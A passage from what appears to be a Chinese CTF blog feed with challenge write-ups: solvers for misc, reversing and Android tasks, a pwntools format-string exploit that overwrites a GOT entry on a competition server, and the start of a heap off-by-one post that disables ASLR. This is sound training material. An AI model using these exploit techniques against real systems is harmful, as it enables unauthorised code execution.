class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">message = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Lines:</span><br><span class="line">    <span class="keyword">if</span>  len(line.replace(<span class="string">'\n'</span>,<span class="string">''</span>))!=<span class="number">16</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> normalKeys.get(line[<span class="number">4</span>:<span class="number">6</span>]) != <span class="literal">None</span>:</span><br><span class="line">        message += normalKeys.get(line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> message</span><br></pre></td></tr></table></figure><ul><li>得到压缩包密码,解压即可得到flag.txt,里面就有flag。</li></ul><h1 id="0x05-Re"><a href="#0x05-Re" class="headerlink" title="0x05 Re"></a>0x05 Re</h1><h2 id="0x001Python是世界上最好的语言"><a href="#0x001Python是世界上最好的语言" class="headerlink" title="0x001Python是世界上最好的语言"></a>0x001Python是世界上最好的语言</h2><ul><li>比赛时这道题反编译总是不成功,还以为是工具出了问题…结果比完以后大佬告诉我pyc的文件头被改了…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg" alt></p><ul><li>正常的pyc的文件头应该是<code>03 F3 0D 0A</code>,而这道题被改成<code>20 19 0D 0A</code>, 把文件头再改回来以后就可以正常反编译了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105080300.png" alt></p><ul><li><p>这算法和素数有关,懒得逆回去了,直接正向爆破(因为知道了输出)。</p></li><li><p>根据其他题的flag, 这道题目的flag也会是由<code>0123456789abcdef</code>以及<code>lg{}</code>(用来组成flag)组成,那么只需要解出来这些里的每个字符的输出, 然后去跟题目给的输出进行比对就能找出flag。(如果觉得flag还会由其他字符组成,可自行尝试,原理一样)</p></li><li><p>所以Python脚本如下,写脚本的能力还是有待提高啊!</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment">#可能存在于flag中的字符。</span></span><br><span class="line">flagtable = <span class="string">'0123456789abcdeflg&#123;&#125;'</span></span><br><span class="line"><span class="comment">#定义的一个字典,用于保存flag字符及其对应的键值。</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flagtable:</span><br><span class="line">    Sd.append(ord(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(SdSdSd)</span>:</span></span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = int(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> Sd:</span><br><span class="line">    func(SdSdSdSd)</span><br><span class="line">    dic.update( &#123;chr(SdSdSdSd) : SdSd&#125; )<span class="comment">#这个位置根据题目的py脚本改的。</span></span><br><span class="line">    SdSd = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#自己定义了一个根据键值寻找键的函数,python好像没有现成的函数？</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(d,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [k <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items() <span class="keyword">if</span> v == value]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这三行把out.txt的内容转换成了一个List的形式, print s以后直接把输出结果复制粘贴,然后赋值给outList就行~</span></span><br><span class="line"><span class="comment">#outstr = '''['3', '4', '18'] ['3', '3', '4', '4', '4'] ['98'] ['104'] ['4', '42'] ['102'] ['3', '8', '8'] ['3', '3', '3', '3', '4'] ['4', '4', '12'] ['3', '4', '18'] ['3', '6', '6'] ['3', '4', '18'] ['8', '8'] ['3', '8', '8'] ['3', '4', '18'] ['4', '4', '12'] ['4', '20'] ['4', '20'] ['4', '20'] ['3', '3', '3', '3', '4'] ['102'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['4', '18'] ['4', '20'] ['4', '20'] ['98'] ['3', '6', '6'] ['3', '8', '8'] ['3', '8', '8'] ['3', '3', '6', '6'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['3', '3', '6', '6'] ['3', '3', '14'] ['6', '6', '6']'''</span></span><br><span class="line"><span class="comment">#s = outstr.replace('\'' , '').replace('] [' , '] , [')</span></span><br><span class="line"><span class="comment">#print s</span></span><br><span class="line"></span><br><span class="line">outList = [[<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>] , [<span class="number">98</span>] , [<span class="number">104</span>] , [<span class="number">4</span>, <span class="number">42</span>] , [<span class="number">102</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>] , [<span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>] , [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">4</span>, <span class="number">18</span>] , [<span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>] , [<span class="number">4</span>, <span class="number">20</span>] ,</span><br><span class="line">           [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>] , [<span class="number">102</span>] , [<span class="number">102</span>] , [<span class="number">4</span>, <span class="number">18</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">4</span>, <span class="number">18</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">4</span>, <span class="number">20</span>] , [<span class="number">98</span>] , [<span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">102</span>] , [<span class="number">4</span>, <span class="number">18</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , </span><br><span class="line">           [<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>] , [<span class="number">3</span>, <span class="number">3</span>, <span class="number">14</span>] , [<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> outList:</span><br><span class="line">    flag += get_key(dic,key)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="0x06-Moble"><a href="#0x06-Moble" class="headerlink" title="0x06 Moble"></a>0x06 Moble</h1><h2 id="0x001-简单的apk"><a href="#0x001-简单的apk" class="headerlink" title="0x001 简单的apk"></a>0x001 简单的apk</h2><ul><li>根据关键算法</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">check</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Object localObject = paramString.toCharArray();</span><br><span class="line">  <span class="keyword">if</span> (localObject.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"请输入内容"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; localObject.length; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject[j] &lt; <span class="string">'0'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"你的输入应该为纯数字！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (localObject[j] &gt; <span class="string">'9'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"你的输入应该为纯数字！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (localObject.length != <span class="number">15</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"出错啦！"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  localObject = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span> (j = i; j &lt; paramString.length(); j++)</span><br><span class="line">  &#123;</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    localStringBuilder.append((String)localObject);</span><br><span class="line">    i = paramString.charAt(j);</span><br><span class="line">    localStringBuilder.append(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; <span class="number">83</span>, <span class="number">100</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">57</span> &#125;[(i - <span class="number">48</span>)]);</span><br><span class="line">    localObject = localStringBuilder.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (((String)localObject).equals(<span class="string">"sic19Sdc02ds10c"</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    ((StringBuilder)localObject).append(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    ((StringBuilder)localObject).append(md5(paramString));</span><br><span class="line">    ((StringBuilder)localObject).append(<span class="string">"&#125;"</span>);</span><br><span class="line">    <span class="keyword">return</span> ((StringBuilder)localObject).toString();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"你输入的数字不正确"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以得到脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">s = <span class="string">'sic19Sdc02ds10c'</span></span><br><span class="line">L = [<span class="number">83</span>, <span class="number">100</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">57</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    input += str(L.index(ord(i)))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;'</span> + md5.md5(input).hexdigest() + <span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="0x002-贪吃蛇"><a href="#0x002-贪吃蛇" class="headerlink" title="0x002 贪吃蛇"></a>0x002 贪吃蛇</h2><ul><li>关键函数在这俩</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164530.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164553.png" alt></p><ul><li><p>根据代码可以得知,paramInt1应该为90, 然后由paramInt1、paramInt2、paramInt3组成的字符串总共8位。</p></li><li><p>没必要逆算法,直接正向爆破。</p></li><li><p>鉴于str的形式可能是<code>90XXXXXX(其中第一个X取值为1~9)</code>,也可能是<code>900XXXXX</code>,所以采用如下方法进行爆破。(应该会有更优的方案。)</p></li><li><p>把<code>encrypt(int paramInt1, int paramInt2, int paramInt3)</code>变成<code>encrypt(int paramInt1)</code>,下面只保留<code>((StringBuilder)localObject).append(String.valueOf(paramInt1));</code>,这样算是为了方便爆破吧…</p></li><li><p>爆破脚本如下(Java):</p></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test_for_ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">encode</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">	  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String Code = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">	  </span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function">	  </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span> ((paramString != <span class="keyword">null</span>) &amp;&amp; (paramString.length() != <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span>[] arrayOfChar = paramString.toCharArray();</span><br><span class="line">	      StringBuilder localStringBuilder1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++)</span><br><span class="line">	      &#123;</span><br><span class="line">	        StringBuilder localStringBuilder2;</span><br><span class="line">	        String localObject;</span><br><span class="line">			<span class="keyword">for</span> (localObject = Integer.toBinaryString(arrayOfChar[i]); ((String)localObject).length() &lt; <span class="number">8</span>; localObject = localStringBuilder2.toString())</span><br><span class="line">	        &#123;</span><br><span class="line">	          localStringBuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          localStringBuilder2.append(<span class="string">"0"</span>);</span><br><span class="line">	          localStringBuilder2.append((String)localObject);</span><br><span class="line">	        &#125;</span><br><span class="line">	        localStringBuilder1.append((String)localObject);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">while</span> (localStringBuilder1.length() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">	        localStringBuilder1.append(<span class="string">"0"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      Object localObject = String.valueOf(localStringBuilder1);</span><br><span class="line">	      arrayOfChar = <span class="keyword">new</span> <span class="keyword">char</span>[((String)localObject).length() / <span class="number">6</span>];</span><br><span class="line">	      <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++)</span><br><span class="line">	      &#123;</span><br><span class="line">	        <span class="keyword">int</span> j = Integer.parseInt(((String)localObject).substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">	        localObject = ((String)localObject).substring(<span class="number">6</span>);</span><br><span class="line">	        arrayOfChar[i] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>.charAt(j);</span><br><span class="line">	      &#125;</span><br><span class="line">	      localObject = <span class="keyword">new</span> StringBuilder(String.valueOf(arrayOfChar));</span><br><span class="line">	      <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).append(<span class="string">"=="</span>);</span><br><span class="line">	      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).append(<span class="string">"="</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">for</span> (i = <span class="number">76</span>; i &lt; ((StringBuilder)localObject).length(); i += <span class="number">76</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).insert(i, <span class="string">"\r\n"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">return</span> String.valueOf(localObject);</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> paramString;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span> paramInt1)</span></span></span><br><span class="line"><span class="function">	  </span>&#123;</span><br><span class="line">	    Object localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	    ((StringBuilder)localObject).append(String.valueOf(paramInt1));</span><br><span class="line">	    String str = ((StringBuilder)localObject).toString();</span><br><span class="line">	    <span class="keyword">if</span> (str.length() == <span class="number">8</span>) &#123;</span><br><span class="line">	      <span class="keyword">try</span></span><br><span class="line">	      &#123;</span><br><span class="line">	        localObject = MessageDigest.getInstance(<span class="string">"md5"</span>).digest(encode.encode(str).getBytes());</span><br><span class="line">	        localObject = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, (<span class="keyword">byte</span>[])localObject).toString(<span class="number">16</span>);</span><br><span class="line">	        <span class="keyword">for</span> (paramInt1 = <span class="number">0</span>; paramInt1 &lt; <span class="number">32</span> - ((String)localObject).length(); paramInt1++)</span><br><span class="line">	        &#123;</span><br><span class="line">	          StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          localStringBuilder.append(<span class="string">"0"</span>);</span><br><span class="line">	          localStringBuilder.append((String)localObject);</span><br><span class="line">	          localObject = localStringBuilder.toString();</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">if</span> (((String)localObject).equals(<span class="string">"cc3fa9c107c0d8b48d6af32d26eacf2a"</span>))</span><br><span class="line">	        &#123;</span><br><span class="line">	          localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          ((StringBuilder)localObject).append(<span class="string">"flag&#123;"</span>);</span><br><span class="line">	          ((StringBuilder)localObject).append(str);</span><br><span class="line">	          ((StringBuilder)localObject).append(<span class="string">"&#125;"</span>);</span><br><span class="line">	          <span class="keyword">return</span> ((StringBuilder)localObject).toString();</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">return</span> <span class="string">"something wrong"</span>;</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">catch</span> (Exception localException)</span><br><span class="line">	      &#123;</span><br><span class="line">	        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"没有这个md5算法"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="string">"something wrong"</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//爆破str格式为900xxxxx的情况</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;=<span class="number">99999</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			String str = <span class="keyword">new</span> String(<span class="string">"900"</span>);</span><br><span class="line">			str += i;</span><br><span class="line">			<span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">			String sss = encrypt(a);</span><br><span class="line">			<span class="keyword">if</span>(sss!=<span class="string">"something wrong"</span>) &#123;</span><br><span class="line">				System.out.println(sss);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//爆破str格式为90xxxxxx的情况</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;=<span class="number">999999</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			String str = <span class="keyword">new</span> String(<span class="string">"90"</span>);</span><br><span class="line">			str += i;</span><br><span class="line">			<span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">			String sss = encrypt(a);</span><br><span class="line">			<span class="keyword">if</span>(sss!=<span class="string">"something wrong"</span>) &#123;</span><br><span class="line">				System.out.println(sss);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>运行得到flag。</li></ul><h1 id="0x07-Pwn"><a href="#0x07-Pwn" class="headerlink" title="0x07 Pwn"></a>0x07 Pwn</h1><h2 id="0x001-pwn-MinZhu"><a href="#0x001-pwn-MinZhu" class="headerlink" title="0x001 pwn_MinZhu"></a>0x001 pwn_MinZhu</h2><ul><li>考察格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140024.png" alt></p><ul><li><p>程序首先要求输入一段Key并进行验证。</p></li><li><p>这个Key手撕就能弄出来,解出来以后是<code>xNd9y6</code></p></li><li><p>也可以用angr(借鉴表哥思路)</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="number">0x08048817</span>,avoid=<span class="number">0x0804882B</span>)</span><br><span class="line"><span class="keyword">print</span> res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>通过验证后可以来到这个函数,并且发现这个函数存在明显的格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140211.png" alt></p><ul><li>这里的<code>dword_804A064</code>为1, 也就意味着循环只能执行一次,似乎一次循环是不够的,所以可以先通过修改这个值来让循环执行更多次数从而多次利用格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140631.png" alt></p><ul><li><p>发现了<code>cat flag</code>,但需要满足<code>dword_804A060 == 0x2019</code>。</p></li><li><p>所以基本思路确定了, 第一次循环先改掉<code>dword_804A064</code>的值,让这个值大于等于3, 第二次循环让 <code>dword_804A060 == 0x2019</code>, 第三次循环把<code>puts</code>的<code>got</code>换为<code>cat flag</code>所在的地址,这里也可以更换<code>putchar</code>的<code>got</code>。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'172.29.1.28'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./pwn_MinZhu')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn_MinZhu'</span>)</span><br><span class="line"></span><br><span class="line">putsgot = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">totalnum = <span class="number">0x0804A064</span></span><br><span class="line"></span><br><span class="line">targetnum = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048696</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">'xNd9y6'</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(pwd)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'your msg:'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">4</span>,&#123;totalnum:<span class="number">0x03</span>&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>,&#123;targetnum:<span class="number">0x2019</span>&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = fmtstr_payload(<span class="number">4</span>,&#123;putsgot:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload3)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>堆off by one(AsisCTF 2016 b00ks)</title>
    <url>/2020/01/17/%E5%A0%86off-by-one-AsisCTF-2016-b00ks/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/H86addc66dd6c41818407f91b5d26cf01k.jpg" alt></p><a id="more"></a><p><em>Some things will never start if you don’t begin to do them.</em></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>这是<code>CTF-WIKI</code>上用来讲解<code>off-by-one</code>的一道例题,但是显然上面的讲解对新手并不友好,在查阅各种资料、看了各位大佬们的博客后，终于把这道题目搞懂了。</li><li>因为这道题目面向新手的WP并不多，所以特地写下这篇博客，尽可能全面的讲解一下这道题目。</li></ul><h1 id="0x01-题目下载链接"><a href="#0x01-题目下载链接" class="headerlink" title="0x01 题目下载链接"></a>0x01 题目下载链接</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks" target="_blank" rel="noopener">下载链接</a></p><h1 id="0x02-off-by-one-知识储备"><a href="#0x02-off-by-one-知识储备" class="headerlink" title="0x02 off-by-one 知识储备"></a>0x02 off-by-one 知识储备</h1><ul><li>相关知识在<code>CTF-WIKI</code>上也有较为详细的讲解，此处略过。</li><li>为了更好的理解本文，建议先看看<code>CTF-WIKI</code>上的相关讲解，同时也要好好理解指针的相关概念。</li></ul><h1 id="0x03-分析程序与调试"><a href="#0x03-分析程序与调试" class="headerlink" title="0x03 分析程序与调试"></a>0x03 分析程序与调试</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117232225.png" alt></p><ul><li><p>一些函数我都进行了<code>重命名</code>，这里这些函数比如<code>create</code>、<code>delete</code>都可以先点进去看看,要了解这些函数能实现什么功能，从而为后续利用做准备。</p></li><li><p>同时为了方便调试，临时禁用了系统的地址随机化功能：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p></li></ul><h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><ul><li>进入<code>change_author_name函数</code>，然后观察<code>my_read函数</code>，发现在存在<code>off-by-one漏洞</code>，由于程序没有对边界进行正确限定而产生了此处漏洞，该漏洞会越界并将低字节覆盖为<code>\x00</code>。</li><li>很遗憾的是，只有<code>change_author_name函数</code>存在这个漏洞，其他函数例如<code>create函数</code>都额外做了边界限制处理。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">change_author_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)my_read(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> 